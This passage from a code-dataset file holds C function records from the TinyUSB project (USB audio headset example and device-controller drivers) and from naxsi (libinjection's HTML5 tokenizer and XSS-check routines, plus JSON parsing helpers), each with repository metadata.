  }\n    else if (request->bRequest == AUDIO_CS_REQ_CUR)\n    {\n      audio_control_cur_2_t cur_vol = { .bCur = tu_htole16(volume[request->bChannelNumber]) };\n      TU_LOG2(\"Get channel %u volume %u dB\\r\\n\", request->bChannelNumber, cur_vol.bCur);\n      return tud_audio_buffer_and_schedule_control_xfer(rhport, (tusb_control_request_t const *)request, &cur_vol, sizeof(cur_vol));\n    }\n  }\n  TU_LOG1(\"Feature unit get request not supported, entity = %u, selector = %u, request = %u\\r\\n\",\n          request->bEntityID, request->bControlSelector, request->bRequest);\n\n  return false;\n}", "path": "tinyusb/examples/device/uac2_headset/src/main.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "//--------------------------------------------------------------------+\n// AUDIO Task\n//--------------------------------------------------------------------+\n", "func_signal": "void audio_task(void)", "code": "{\n  // When new data arrived, copy data from speaker buffer, to microphone buffer\n  // and send it over\n  if (spk_data_size)\n  {\n    int16_t *src = spk_buf;\n    int16_t *limit = spk_buf + spk_data_size / 2;\n    int16_t *dst = mic_buf;\n    while (src < limit)\n    {\n      // Combine two channels into one\n      int32_t left = *src++;\n      int32_t right = *src++;\n      *dst++ = (int16_t)((left + right) / 2);\n    }\n    tud_audio_write((uint8_t *)mic_buf, spk_data_size / 2);\n    spk_data_size = 0;\n  }\n}", "path": "tinyusb/examples/device/uac2_headset/src/main.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "//--------------------------------------------------------------------+\n// Interrupt Handler\n//--------------------------------------------------------------------+\n", "func_signal": "void maybe_transfer_complete(void)", "code": "{\n  uint32_t epints = USB->DEVICE.EPINTSMRY.reg;\n\n  for (uint8_t epnum = 0; epnum < USB_EPT_NUM; epnum++) {\n    if ((epints & (1 << epnum)) == 0) {\n      continue;\n    }\n\n    UsbDeviceEndpoint* ep = &USB->DEVICE.DeviceEndpoint[epnum];\n    uint32_t epintflag = ep->EPINTFLAG.reg;\n\n    // Handle IN completions\n    if ((epintflag & USB_DEVICE_EPINTFLAG_TRCPT1) != 0) {\n      UsbDeviceDescBank* bank = &sram_registers[epnum][TUSB_DIR_IN];\n      uint16_t const total_transfer_size = bank->PCKSIZE.bit.BYTE_COUNT;\n\n      dcd_event_xfer_complete(0, epnum | TUSB_DIR_IN_MASK, total_transfer_size, XFER_RESULT_SUCCESS, true);\n\n      ep->EPINTFLAG.reg = USB_DEVICE_EPINTFLAG_TRCPT1;\n    }\n\n    // Handle OUT completions\n    if ((epintflag & USB_DEVICE_EPINTFLAG_TRCPT0) != 0) {\n      UsbDeviceDescBank* bank = &sram_registers[epnum][TUSB_DIR_OUT];\n      uint16_t const total_transfer_size = bank->PCKSIZE.bit.BYTE_COUNT;\n\n      dcd_event_xfer_complete(0, epnum, total_transfer_size, XFER_RESULT_SUCCESS, true);\n\n      ep->EPINTFLAG.reg = USB_DEVICE_EPINTFLAG_TRCPT0;\n    }\n  }\n}", "path": "tinyusb/src/portable/microchip/samd/dcd_samd.c", "commit_date": "2020-08-22 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "//--------------------------------------------------------------------+\n// DCD Endpoint Port\n//--------------------------------------------------------------------+\n", "func_signal": "bool dcd_edpt_open(uint8_t rhport, tusb_desc_endpoint_t const * p_endpoint_desc)", "code": "{\n  (void) rhport;\n\n  uint8_t const epnum = tu_edpt_number(p_endpoint_desc->bEndpointAddress);\n  uint8_t const ep_id = ep_addr2idx(p_endpoint_desc->bEndpointAddress);\n\n  // Endpoint type is fixed to endpoint number\n  // 1: interrupt, 2: Bulk, 3: Iso and so on\n  switch ( p_endpoint_desc->bmAttributes.xfer )\n  {\n    case TUSB_XFER_INTERRUPT:\n      TU_ASSERT((epnum % 3) == 1);\n      break;\n\n    case TUSB_XFER_BULK:\n      TU_ASSERT((epnum % 3) == 2 || (epnum == 15));\n      break;\n\n    case TUSB_XFER_ISOCHRONOUS:\n      TU_ASSERT((epnum % 3) == 0 && (epnum != 0) && (epnum != 15));\n      break;\n\n    default:\n      break;\n  }\n\n  //------------- Realize Endpoint with Max Packet Size -------------//\n  set_ep_size(ep_id, p_endpoint_desc->wMaxPacketSize.size);\n\n  //------------- first DD prepare -------------//\n  dma_desc_t* const dd = &_dcd.dd[ep_id];\n  tu_memclr(dd, sizeof(dma_desc_t));\n\n  dd->isochronous = (p_endpoint_desc->bmAttributes.xfer == TUSB_XFER_ISOCHRONOUS) ? 1 : 0;\n  dd->max_packet_size = p_endpoint_desc->wMaxPacketSize.size;\n  dd->retired = 1; // invalid at first\n\n  sie_write(SIE_CMDCODE_ENDPOINT_SET_STATUS + ep_id, 1, 0);    // clear all endpoint status\n\n  return true;\n}", "path": "tinyusb/src/portable/nxp/lpc17_40/dcd_lpc17_40.c", "commit_date": "2020-08-01 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "// connect by enabling internal pull-up resistor on D+/D-\n", "func_signal": "void dcd_connect(uint8_t rhport)", "code": "{\n  (void) rhport;\n   USB->DEVICE.CTRLB.reg &= ~USB_DEVICE_CTRLB_DETACH;\n}", "path": "tinyusb/src/portable/microchip/samd/dcd_samd.c", "commit_date": "2020-08-22 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "// ready for receiving SETUP packet\n", "func_signal": "static inline void prepare_setup(void)", "code": "{\n  // Only make sure the EP0 OUT buffer is ready\n  sram_registers[0][0].ADDR.reg = (uint32_t) _setup_packet;\n  sram_registers[0][0].PCKSIZE.bit.MULTI_PACKET_SIZE = sizeof(_setup_packet);\n  sram_registers[0][0].PCKSIZE.bit.BYTE_COUNT = 0;\n}", "path": "tinyusb/src/portable/microchip/samd/dcd_samd.c", "commit_date": "2020-08-22 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "// Invoked when audio class specific get request received for an entity\n", "func_signal": "bool tud_audio_get_req_entity_cb(uint8_t rhport, tusb_control_request_t const *p_request)", "code": "{\n  audio_control_request_t *request = (audio_control_request_t *)p_request;\n\n  if (request->bEntityID == UAC2_ENTITY_CLOCK)\n    return tud_audio_clock_get_request(rhport, request);\n  if (request->bEntityID == UAC2_ENTITY_SPK_FEATURE_UNIT)\n    return tud_audio_feature_unit_get_request(rhport, request);\n  else\n  {\n    TU_LOG1(\"Get request not handled, entity = %d, selector = %d, request = %d\\r\\n\",\n            request->bEntityID, request->bControlSelector, request->bRequest);\n  }\n  return false;\n}", "path": "tinyusb/examples/device/uac2_headset/src/main.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "// Invoked when received GET STRING DESCRIPTOR request\n// Application return pointer to descriptor, whose contents must exist long enough for transfer to complete\n", "func_signal": "uint16_t const* tud_descriptor_string_cb(uint8_t index, uint16_t langid)", "code": "{\n  (void) langid;\n\n  uint8_t chr_count;\n\n  if ( index == 0)\n  {\n    memcpy(&_desc_str[1], string_desc_arr[0], 2);\n    chr_count = 1;\n  }else\n  {\n    // Note: the 0xEE index string is a Microsoft OS 1.0 Descriptors.\n    // https://docs.microsoft.com/en-us/windows-hardware/drivers/usbcon/microsoft-defined-usb-descriptors\n\n    if ( !(index < sizeof(string_desc_arr)/sizeof(string_desc_arr[0])) ) return NULL;\n\n    const char* str = string_desc_arr[index];\n\n    // Cap at max char\n    chr_count = strlen(str);\n    if ( chr_count > 31 ) chr_count = 31;\n\n    // Convert ASCII string into UTF-16\n    for(uint8_t i=0; i<chr_count; i++)\n    {\n      _desc_str[1+i] = str[i];\n    }\n  }\n\n  // first byte is length (including header), second byte is string type\n  _desc_str[0] = (TUSB_DESC_STRING << 8 ) | (2*chr_count + 2);\n\n  return _desc_str;\n}", "path": "tinyusb/examples/device/midi_test/src/usb_descriptors.c", "commit_date": "2020-07-21 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "// handle bus event signal\n", "func_signal": "static void bus_event_isr(uint8_t rhport)", "code": "{\n  uint8_t const dev_status = sie_read(SIE_CMDCODE_DEVICE_STATUS);\n  if (dev_status & SIE_DEV_STATUS_RESET_MASK)\n  {\n    bus_reset();\n    dcd_event_bus_signal(rhport, DCD_EVENT_BUS_RESET, true);\n  }\n\n  if (dev_status & SIE_DEV_STATUS_CONNECT_CHANGE_MASK)\n  {\n    // device is disconnected, require using VBUS (P1_30)\n    dcd_event_bus_signal(rhport, DCD_EVENT_UNPLUGGED, true);\n  }\n\n  if (dev_status & SIE_DEV_STATUS_SUSPEND_CHANGE_MASK)\n  {\n    if (dev_status & SIE_DEV_STATUS_SUSPEND_MASK)\n    {\n      dcd_event_bus_signal(rhport, DCD_EVENT_SUSPEND, true);\n    }\n    else\n    {\n      dcd_event_bus_signal(rhport, DCD_EVENT_RESUME, true);\n    }\n  }\n}", "path": "tinyusb/src/portable/nxp/lpc17_40/dcd_lpc17_40.c", "commit_date": "2020-08-01 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "// Helper for clock get requests\n", "func_signal": "static bool tud_audio_clock_get_request(uint8_t rhport, audio_control_request_t const *request)", "code": "{\n  TU_ASSERT(request->bEntityID == UAC2_ENTITY_CLOCK);\n\n  // Example supports only single frequency, same value will be used for current value and range\n  if (request->bControlSelector == AUDIO_CS_CTRL_SAM_FREQ)\n  {\n    if (request->bRequest == AUDIO_CS_REQ_CUR)\n    {\n      TU_LOG2(\"Clock get current freq %u\\r\\n\", AUDIO_SAMPLE_RATE);\n\n      audio_control_cur_4_t curf = { tu_htole32(AUDIO_SAMPLE_RATE) };\n      return tud_audio_buffer_and_schedule_control_xfer(rhport, (tusb_control_request_t const *)request, &curf, sizeof(curf));\n    }\n    else if (request->bRequest == AUDIO_CS_REQ_RANGE)\n    {\n      audio_control_range_4_n_t(1) rangef =\n      {\n        .wNumSubRanges = tu_htole16(1),\n        .subrange[0] = { tu_htole32(AUDIO_SAMPLE_RATE), tu_htole32(AUDIO_SAMPLE_RATE), 0}\n      };\n      TU_LOG2(\"Clock get freq range (%d, %d, %d)\\r\\n\", (int)rangef.subrange[0].bMin, (int)rangef.subrange[0].bMax, (int)rangef.subrange[0].bRes);\n      return tud_audio_buffer_and_schedule_control_xfer(rhport, (tusb_control_request_t const *)request, &rangef, sizeof(rangef));\n    }\n  }\n  else if (request->bControlSelector == AUDIO_CS_CTRL_CLK_VALID &&\n           request->bRequest == AUDIO_CS_REQ_CUR)\n  {\n    audio_control_cur_1_t cur_valid = { .bCur = 1 };\n    TU_LOG2(\"Clock get is valid %u\\r\\n\", cur_valid.bCur);\n    return tud_audio_buffer_and_schedule_control_xfer(rhport, (tusb_control_request_t const *)request, &cur_valid, sizeof(cur_valid));\n  }\n  TU_LOG1(\"Clock get request not supported, entity = %u, selector = %u, request = %u\\r\\n\",\n          request->bEntityID, request->bControlSelector, request->bRequest);\n  return false;\n}", "path": "tinyusb/examples/device/uac2_headset/src/main.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "/*------------- MAIN -------------*/\n", "func_signal": "int main(void)", "code": "{\n  board_init();\n\n  tusb_init();\n\n  TU_LOG1(\"Headset running\\r\\n\");\n\n  while (1)\n  {\n    tud_task(); // TinyUSB device task\n    audio_task();\n    led_blinking_task();\n  }\n\n  return 0;\n}", "path": "tinyusb/examples/device/uac2_headset/src/main.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "// Invoked when a control transfer's status stage is complete.\n// May help DCD to prepare for next control transfer, this API is optional.\n", "func_signal": "void dcd_edpt0_status_complete(uint8_t rhport, tusb_control_request_t const * request)", "code": "{\n  (void) rhport;\n\n  if (request->bmRequestType_bit.recipient == TUSB_REQ_RCPT_DEVICE &&\n      request->bmRequestType_bit.type == TUSB_REQ_TYPE_STANDARD &&\n      request->bRequest == TUSB_REQ_SET_ADDRESS )\n  {\n    uint8_t const dev_addr = (uint8_t) request->wValue;\n    USB->DEVICE.DADD.reg = USB_DEVICE_DADD_DADD(dev_addr) | USB_DEVICE_DADD_ADDEN;\n  }\n\n  // Just finished status stage, prepare for next setup packet\n  // Note: we may already prepare setup when queueing the control status.\n  // but it has no harm to do it again here\n  prepare_setup();\n}", "path": "tinyusb/src/portable/microchip/samd/dcd_samd.c", "commit_date": "2020-08-22 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "/*------------------------------------------------------------------*/\n/* Controller API\n *------------------------------------------------------------------*/\n", "func_signal": "void dcd_init (uint8_t rhport)", "code": "{\n  (void) rhport;\n\n  // Reset to get in a clean state.\n  USB->DEVICE.CTRLA.bit.SWRST = true;\n  while (USB->DEVICE.SYNCBUSY.bit.SWRST == 0) {}\n  while (USB->DEVICE.SYNCBUSY.bit.SWRST == 1) {}\n\n  USB->DEVICE.PADCAL.bit.TRANSP = (*((uint32_t*) USB_FUSES_TRANSP_ADDR) & USB_FUSES_TRANSP_Msk) >> USB_FUSES_TRANSP_Pos;\n  USB->DEVICE.PADCAL.bit.TRANSN = (*((uint32_t*) USB_FUSES_TRANSN_ADDR) & USB_FUSES_TRANSN_Msk) >> USB_FUSES_TRANSN_Pos;\n  USB->DEVICE.PADCAL.bit.TRIM   = (*((uint32_t*) USB_FUSES_TRIM_ADDR) & USB_FUSES_TRIM_Msk) >> USB_FUSES_TRIM_Pos;\n\n  USB->DEVICE.QOSCTRL.bit.CQOS = 3; // High Quality\n  USB->DEVICE.QOSCTRL.bit.DQOS = 3; // High Quality\n\n  // Configure registers\n  USB->DEVICE.DESCADD.reg = (uint32_t) &sram_registers;\n  USB->DEVICE.CTRLB.reg = USB_DEVICE_CTRLB_SPDCONF_FS;\n  USB->DEVICE.CTRLA.reg = USB_CTRLA_MODE_DEVICE | USB_CTRLA_ENABLE | USB_CTRLA_RUNSTDBY;\n  while (USB->DEVICE.SYNCBUSY.bit.ENABLE == 1) {}\n\n  USB->DEVICE.INTFLAG.reg |= USB->DEVICE.INTFLAG.reg; // clear pending\n  USB->DEVICE.INTENSET.reg = /* USB_DEVICE_INTENSET_SOF | */ USB_DEVICE_INTENSET_EORST;\n}", "path": "tinyusb/src/portable/microchip/samd/dcd_samd.c", "commit_date": "2020-08-22 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "// Setup the control endpoint 0.\n", "func_signal": "static void bus_reset(void)", "code": "{\n  // Max size of packets is 64 bytes.\n  UsbDeviceDescBank* bank_out = &sram_registers[0][TUSB_DIR_OUT];\n  bank_out->PCKSIZE.bit.SIZE = 0x3;\n  UsbDeviceDescBank* bank_in = &sram_registers[0][TUSB_DIR_IN];\n  bank_in->PCKSIZE.bit.SIZE = 0x3;\n\n  UsbDeviceEndpoint* ep = &USB->DEVICE.DeviceEndpoint[0];\n  ep->EPCFG.reg = USB_DEVICE_EPCFG_EPTYPE0(0x1) | USB_DEVICE_EPCFG_EPTYPE1(0x1);\n  ep->EPINTENSET.reg = USB_DEVICE_EPINTENSET_TRCPT0 | USB_DEVICE_EPINTENSET_TRCPT1 | USB_DEVICE_EPINTENSET_RXSTP;\n\n  // Prepare for setup packet\n  prepare_setup();\n}", "path": "tinyusb/src/portable/microchip/samd/dcd_samd.c", "commit_date": "2020-08-22 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "/**\n * 12 2.4.8\n */\n", "func_signal": "static int h5_state_tag_open(h5_state_t* hs)", "code": "{\n    char ch;\n\n    TRACE();\n    if (hs->pos >= hs->len) {\n        return 0;\n    }\n    ch = hs->s[hs->pos];\n    if (ch == CHAR_BANG) {\n        hs->pos += 1;\n        return h5_state_markup_declaration_open(hs);\n    } else if (ch == CHAR_SLASH) {\n        hs->pos += 1;\n        hs->is_close = 1;\n        return h5_state_end_tag_open(hs);\n    } else if (ch == CHAR_QUESTION) {\n        hs->pos += 1;\n        return h5_state_bogus_comment(hs);\n    } else if (ch == CHAR_PERCENT) {\n        /* this is not in spec.. alternative comment format used\n           by IE <= 9 and Safari < 4.0.3 */\n        hs->pos += 1;\n        return h5_state_bogus_comment2(hs);\n    } else if ((ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z')) {\n        return h5_state_tag_name(hs);\n    } else if (ch == CHAR_NULL) {\n        /* IE-ism  NULL characters are ignored */\n        return h5_state_tag_name(hs);\n    } else {\n        /* user input mistake in configuring state */\n        if (hs->pos == 0) {\n            return h5_state_data(hs);\n        }\n        hs->token_start = hs->s + hs->pos - 1;\n        hs->token_len = 1;\n        hs->token_type = DATA_TEXT;\n        hs->state = h5_state_data;\n        return 1;\n    }\n}", "path": "naxsi/naxsi_src/ext/libinjection/libinjection_html5.c", "commit_date": "2020-09-24 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/**\n * public function\n */\n", "func_signal": "void libinjection_h5_init(h5_state_t* hs, const char* s, size_t len, enum html5_flags flags)", "code": "{\n    memset(hs, 0, sizeof(h5_state_t));\n    hs->s = s;\n    hs->len = len;\n\n    switch (flags) {\n    case DATA_STATE:\n        hs->state = h5_state_data;\n        break;\n    case VALUE_NO_QUOTE:\n        hs->state = h5_state_before_attribute_name;\n        break;\n    case VALUE_SINGLE_QUOTE:\n        hs->state = h5_state_attribute_value_single_quote;\n        break;\n    case VALUE_DOUBLE_QUOTE:\n        hs->state = h5_state_attribute_value_double_quote;\n        break;\n    case VALUE_BACK_QUOTE:\n        hs->state = h5_state_attribute_value_back_quote;\n        break;\n    }\n}", "path": "naxsi/naxsi_src/ext/libinjection/libinjection_html5.c", "commit_date": "2020-09-24 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/**\n * 12.2.4.10\n */\n", "func_signal": "static int h5_state_tag_name(h5_state_t* hs)", "code": "{\n    char ch;\n    size_t pos;\n\n    TRACE();\n    pos = hs->pos;\n    while (pos < hs->len) {\n        ch = hs->s[pos];\n        if (ch == 0) {\n            /* special non-standard case */\n            /* allow nulls in tag name   */\n            /* some old browsers apparently allow and ignore them */\n            pos += 1;\n        } else if (h5_is_white(ch)) {\n            hs->token_start = hs->s + hs->pos;\n            hs->token_len = pos - hs->pos;\n            hs->token_type = TAG_NAME_OPEN;\n            hs->pos = pos + 1;\n            hs->state = h5_state_before_attribute_name;\n            return 1;\n        } else if (ch == CHAR_SLASH) {\n            hs->token_start = hs->s + hs->pos;\n            hs->token_len = pos - hs->pos;\n            hs->token_type = TAG_NAME_OPEN;\n            hs->pos = pos + 1;\n            hs->state = h5_state_self_closing_start_tag;\n            return 1;\n        } else if (ch == CHAR_GT) {\n            hs->token_start = hs->s + hs->pos;\n            hs->token_len = pos - hs->pos;\n            if (hs->is_close) {\n                hs->pos = pos + 1;\n                hs->is_close = 0;\n                hs->token_type = TAG_CLOSE;\n                hs->state = h5_state_data;\n            } else {\n                hs->pos = pos;\n                hs->token_type = TAG_NAME_OPEN;\n                hs->state = h5_state_tag_name_close;\n            }\n            return 1;\n        } else {\n            pos += 1;\n        }\n    }\n\n    hs->token_start = hs->s + hs->pos;\n    hs->token_len = hs->len - hs->pos;\n    hs->token_type = TAG_NAME_OPEN;\n    hs->state = h5_state_eof;\n    return 1;\n}", "path": "naxsi/naxsi_src/ext/libinjection/libinjection_html5.c", "commit_date": "2020-09-24 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/*\n * Does an HTML encoded  binary string (const char*, length) start with\n * a all uppercase c-string (null terminated), case insensitive!\n *\n * also ignore any embedded nulls in the HTML string!\n *\n * return 1 if match / starts with\n * return 0 if not\n */\n", "func_signal": "static int htmlencode_startswith(const char *a, const char *b, size_t n)", "code": "{\n    size_t consumed;\n    int cb;\n    int first = 1;\n    /* printf(\"Comparing %s with %.*s\\n\", a,(int)n,b); */\n    while (n > 0) {\n        if (*a == 0) {\n            /* printf(\"Match EOL!\\n\"); */\n            return 1;\n        }\n        cb = html_decode_char_at(b, n, &consumed);\n        b += consumed;\n        n -= consumed;\n\n        if (first && cb <= 32) {\n            /* ignore all leading whitespace and control characters */\n            continue;\n        }\n        first = 0;\n\n        if (cb == 0) {\n            /* always ignore null characters in user input */\n            continue;\n        }\n\n        if (cb == 10) {\n            /* always ignore vertical tab characters in user input */\n            /* who allows this?? */\n            continue;\n        }\n\n        if (cb >= 'a' && cb <= 'z') {\n            /* upcase */\n            cb -= 0x20;\n        }\n\n        if (*a != (char) cb) {\n            /* printf(\"    %c != %c\\n\", *a, cb); */\n            /* mismatch */\n            return 0;\n        }\n        a++;\n    }\n\n    return (*a == 0) ? 1 : 0;\n}", "path": "naxsi/naxsi_src/ext/libinjection/libinjection_xss.c", "commit_date": "2020-09-24 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/**\n * 12.2.4.36\n */\n", "func_signal": "static int h5_state_after_attribute_name(h5_state_t* hs)", "code": "{\n    int c;\n\n    TRACE();\n    c = h5_skip_white(hs);\n    switch (c) {\n    case CHAR_EOF: {\n        return 0;\n    }\n    case CHAR_SLASH: {\n        hs->pos += 1;\n        return h5_state_self_closing_start_tag(hs);\n    }\n    case CHAR_EQUALS: {\n        hs->pos += 1;\n        return h5_state_before_attribute_value(hs);\n    }\n    case CHAR_GT: {\n        return h5_state_tag_name_close(hs);\n    }\n    default: {\n        return h5_state_attribute_name(hs);\n    }\n    }\n}", "path": "naxsi/naxsi_src/ext/libinjection/libinjection_html5.c", "commit_date": "2020-09-24 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/*\n** used to fast forward in json POSTS,\n** we skip whitespaces/tab/CR/LF\n*/\n", "func_signal": "ngx_int_t\nngx_http_nx_json_seek(ngx_json_t* js, unsigned char seek)", "code": "{\n  ngx_http_nx_json_forward(js);\n  if (js->c != seek) {\n    return (NGX_ERROR);\n  }\n  return (NGX_OK);\n}", "path": "naxsi/naxsi_src/naxsi_json.c", "commit_date": "2020-09-25 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/*\n** extract a quoted strings,\n** JSON spec only supports double-quoted strings,\n** so do we.\n*/\n", "func_signal": "ngx_int_t\nngx_http_nx_json_quoted(ngx_json_t* js, ngx_str_t* ve)", "code": "{\n  u_char *vn_start, *vn_end;\n\n  vn_start = vn_end = NULL;\n\n  return_value_if(*json_char(js) != '\"', NGX_ERROR);\n  js->off++;\n  vn_start = json_char(js);\n  /* extract varname inbetween \"...\"*/\n  while (js->off < js->len) {\n    /* skip next character if backslashed */\n    if (*json_char(js) == '\\\\') {\n      js->off += 2;\n      if (js->off >= js->len)\n        break;\n      continue;\n    }\n    if (*json_char(js) == '\"') {\n      vn_end = js->src + js->off;\n      js->off++;\n      break;\n    }\n    js->off++;\n  }\n  if (!vn_start || !vn_end) {\n    return (NGX_ERROR);\n  }\n  if (!*vn_start || !*vn_end) {\n    return (NGX_ERROR);\n  }\n  ve->data = vn_start;\n  ve->len  = vn_end - vn_start;\n  return (NGX_OK);\n}", "path": "naxsi/naxsi_src/naxsi_json.c", "commit_date": "2020-09-25 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/**\n * public function\n */\n", "func_signal": "int libinjection_h5_next(h5_state_t* hs)", "code": "{\n    assert(hs->state != NULL);\n    return (*hs->state)(hs);\n}", "path": "naxsi/naxsi_src/ext/libinjection/libinjection_html5.c", "commit_date": "2020-09-24 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/**\n * 12.2.4.34\n */\n", "func_signal": "static int h5_state_before_attribute_name(h5_state_t* hs)", "code": "{\n    int ch;\n\n    TRACE();\n    ch = h5_skip_white(hs);\n    switch (ch) {\n    case CHAR_EOF: {\n        return 0;\n    }\n    case CHAR_SLASH: {\n        hs->pos += 1;\n        return h5_state_self_closing_start_tag(hs);\n    }\n    case CHAR_GT: {\n        hs->state = h5_state_data;\n        hs->token_start = hs->s + hs->pos;\n        hs->token_len = 1;\n        hs->token_type = TAG_NAME_CLOSE;\n        hs->pos += 1;\n        return 1;\n    }\n    default: {\n        return h5_state_attribute_name(hs);\n    }\n    }\n}", "path": "naxsi/naxsi_src/ext/libinjection/libinjection_html5.c", "commit_date": "2020-09-24 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/*\n * wrapper\n *\n *\n * const char* s: is expected to be a null terminated string.\n * size_t len: should represent the length of the string\n *             without the null terminator - strlen(s). \n * \n * Further info:\n *   - https://github.com/client9/libinjection/issues/150\n *\n */\n", "func_signal": "int libinjection_xss(const char* s, size_t len)", "code": "{\n    if (libinjection_is_xss(s, len, DATA_STATE)) {\n        return 1;\n    }\n    if (libinjection_is_xss(s, len, VALUE_NO_QUOTE)) {\n        return 1;\n    }\n    if (libinjection_is_xss(s, len, VALUE_SINGLE_QUOTE)) {\n        return 1;\n    }\n    if (libinjection_is_xss(s, len, VALUE_DOUBLE_QUOTE)) {\n        return 1;\n    }\n    if (libinjection_is_xss(s, len, VALUE_BACK_QUOTE)) {\n        return 1;\n    }\n\n    return 0;\n}", "path": "naxsi/naxsi_src/ext/libinjection/libinjection_xss.c", "commit_date": "2020-09-24 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/**\n * 12.2.4.48\n * 12.2.4.49\n * 12.2.4.50\n * 12.2.4.51\n *   state machine spec is confusing since it can only look\n *   at one character at a time but simply it's comments end by:\n *   1) EOF\n *   2) ending in -->\n *   3) ending in -!>\n */\n", "func_signal": "static int h5_state_comment(h5_state_t* hs)", "code": "{\n    char ch;\n    const char* idx;\n    size_t pos;\n    size_t offset;\n    const char* end = hs->s + hs->len;\n\n    TRACE();\n    pos = hs->pos;\n    while (1) {\n\n        idx = (const char*) memchr(hs->s + pos, CHAR_DASH, hs->len - pos);\n\n        /* did not find anything or has less than 3 chars left */\n        if (idx == NULL || idx > hs->s + hs->len - 3) {\n            hs->state = h5_state_eof;\n            hs->token_start = hs->s + hs->pos;\n            hs->token_len = hs->len - hs->pos;\n            hs->token_type = TAG_COMMENT;\n            return 1;\n        }\n        offset = 1;\n\n        /* skip all nulls */\n        while (idx + offset < end && *(idx + offset) == 0) {\n            offset += 1;\n        }\n        if (idx + offset == end) {\n            hs->state = h5_state_eof;\n            hs->token_start = hs->s + hs->pos;\n            hs->token_len = hs->len - hs->pos;\n            hs->token_type = TAG_COMMENT;\n            return 1;\n        }\n\n        ch = *(idx + offset);\n        if (ch != CHAR_DASH && ch != CHAR_BANG) {\n            pos = (size_t)(idx - hs->s) + 1;\n            continue;\n        }\n\n        /* need to test */\n#if 0\n        /* skip all nulls */\n        while (idx + offset < end && *(idx + offset) == 0) {\n            offset += 1;\n        }\n        if (idx + offset == end) {\n            hs->state = h5_state_eof;\n            hs->token_start = hs->s + hs->pos;\n            hs->token_len = hs->len - hs->pos;\n            hs->token_type = TAG_COMMENT;\n            return 1;\n        }\n#endif\n\n        offset += 1;\n        if (idx + offset == end) {\n            hs->state = h5_state_eof;\n            hs->token_start = hs->s + hs->pos;\n            hs->token_len = hs->len - hs->pos;\n            hs->token_type = TAG_COMMENT;\n            return 1;\n        }\n\n\n        ch = *(idx + offset);\n        if (ch != CHAR_GT) {\n            pos = (size_t)(idx - hs->s) + 1;\n            continue;\n        }\n        offset += 1;\n\n        /* ends in --> or -!> */\n        hs->token_start = hs->s + hs->pos;\n        hs->token_len = (size_t)(idx - hs->s) - hs->pos;\n        hs->pos = (size_t)(idx + offset - hs->s);\n        hs->state = h5_state_data;\n        hs->token_type = TAG_COMMENT;\n        return 1;\n    }\n}", "path": "naxsi/naxsi_src/ext/libinjection/libinjection_html5.c", "commit_date": "2020-09-24 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
